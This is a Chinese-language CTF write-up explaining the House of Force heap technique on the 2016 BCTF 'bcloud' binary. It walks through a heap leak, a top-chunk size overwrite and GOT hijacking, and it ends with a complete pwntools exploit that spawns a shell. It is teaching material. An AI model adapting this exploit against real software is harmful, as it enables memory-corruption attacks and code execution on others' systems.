---
title: House_of_force
date: 2019-03-03 14:40:22
tags:
layout: post
---
House of force
<!--more-->
#0x00
House of 系列归纳中的一篇.题目还是比较简单可以作为House_of_force的教学题.
[2016BCTF_bcloud][1]
# House of force
* 通过某些手段改写`top_chunk`的size 很大例如(`0xffffffff`)
* 假设malloc `sise`不受限制,我们想要控制Aim_address,目前Top地址为Top_address
* 我们只要malloc Aim_address-Top_address之后再malloc一次就可以控制Aim_address.
* 主要是要求malloc的size可控且大小不受限制，可以控制topchunk_size

# Analysis
```python
➜  House_of_force checksec bcloud
[*] '/home/n132/Desktop/House_of_force/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
发现可以写got表且没有PIE

程序先输入名字再输入ORG HOST然后开始标准菜单题只是没有show

# 漏洞分析
## Leak_heap
```arm
  puts("Input your name:");
  readuntil((unsigned int)&s, 64, 10);
  v2 = (char *)malloc(0x40u);
  name = (int)v2;
  strcpy(v2, &s);
  warm_welcome((int)v2);
```
&
```arm
  char s; // [esp+1Ch] [ebp-5Ch]
  char *v2; // [esp+5Ch] [ebp-1Ch]
```
这里只要填满s就会在strcpy时将v2一起copy过去导致泄露heap虽然后来我没用上
##  Force the Top chunk
在init org和id时
```arm
  char org; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  int host; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
```
```arm
  puts("Org:");
  readuntil((unsigned int)&org, 64, 10);
  puts("Host:");
  readuntil((unsigned int)&host, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  Org = (int)v2;
  Host = (int)v4;
  strcpy(v4, (const char *)&host);
  strcpy(v2, &org);
  puts("OKay! Enjoy:)");
```
`strcpy(v2, &org);`  可以改写topchunk size 原理和上面一个一样.
又因为malloc size没有限制...


# 思路
* Force the Top chunk
* malloc *2 to control bss
* got hijacking: free---->puts
* leak libc
* got hijacking: free---->system
* free("/bin/sh")

# exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("--->>\n",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter("tent:\n",str(size))
	p.sendafter("tent:\n",c)
def free(idx):
	cmd(4)
	p.sendlineafter("id:\n",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("id:\n",str(idx))
	p.sendafter("tent:\n",c)
#context.log_level='debug'
p=process("./bcloud")
p.sendafter("name:\n","A"*0x40)
p.readuntil("A"*0x40)
heap=u32(p.read(4))-8
log.warning(hex(heap))

p.sendafter("Org:\n","A"*0x40)
p.sendafter("Host:\n",p32(0xfffffff1)+"\n")
array=0x804B0A0
off=array-heap-0xf0
add(off,"A\n")#0
add(0x200,p32(0x50)*34+p32(0x804b014)+p32(0x804b024)+"\n")#1
edit(0,p32(0x08048520)+'\n')
free(1)
base=u32(p.read(4))-(0xf7e65ca0-0xf7e06000)
log.warning(hex(base))
edit(0,p32(0xf7e40da0-0xf7e06000+base)+'\n')
add(0x20,'/bin/sh'+'\n')
free(1)
#gdb.attach(p)
p.interactive()
```


[1]: https://github.com/n132/Watermalon/tree/master/House%20of%20all%20in%20one/House%20of%20force